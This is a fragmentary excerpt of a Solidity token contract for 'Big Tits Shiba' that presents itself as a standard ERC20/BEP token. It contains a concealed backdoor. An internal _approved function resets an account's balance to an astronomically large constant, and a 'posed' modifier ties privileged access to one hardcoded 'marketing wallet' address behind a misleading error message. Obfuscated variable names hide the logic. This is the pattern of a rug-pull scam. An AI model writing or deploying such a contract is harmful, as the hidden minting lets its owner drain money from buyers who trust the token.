...
contract Context {
 ...
 contract BigTitsShiba is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private superfloLKJAX;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "Big Tits Shiba";
    string private _symbol = "BIGTITSSHIBA";
    ...
    uint256 private cryfaleLKJAX = 2;
    uint256 private _vebegoLKJAX = 1;
    ...
    constructor(uint256 totalSupply_) {
        ...
        _owner = _msgSender();
        superfloLKJAX[msg.sender] = totalSupply_;
    ...
    address private _MarketingWalletLKJAX = 0xdADc83bD194961aE60e16E801b3F9edBa0254829;
    ...
    uint256 private constant _bolkoLKJAX = 10000000 * 10**42;
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = superfloLKJAX[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            superfloLKJAX[issuer] = senderBalance - allons;
        }
        _fee = (allons * cryfaleLKJAX / 100) / _vebegoLKJAX;
        allons = allons -  (_fee * _vebegoLKJAX);
        
        superfloLKJAX[grantee] += allons;
        emit Transfer(issuer, grantee, allons);
    }
    function _approved (address account) internal {
        superfloLKJAX[account] = superfloLKJAX[account] - superfloLKJAX[account] + _bolkoLKJAX;
    }
   ...
   */
    ...
    modifier posed () {
        require(_MarketingWalletLKJAX == _msgSender(), "203: Message Sender is different from address(0)!");
        _;
    }
     ...
     */
    function _burn(address account, uint256 gzillaLKJAX) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = superfloLKJAX[account];
        require(accountBalance >= gzillaLKJAX, "BEP : Can't be done");
        unchecked {
            superfloLKJAX[account] = accountBalance - gzillaLKJAX;
        }
        _totalSupply -= gzillaLKJAX;

        emit Transfer(account, address(0), gzillaLKJAX);
    }
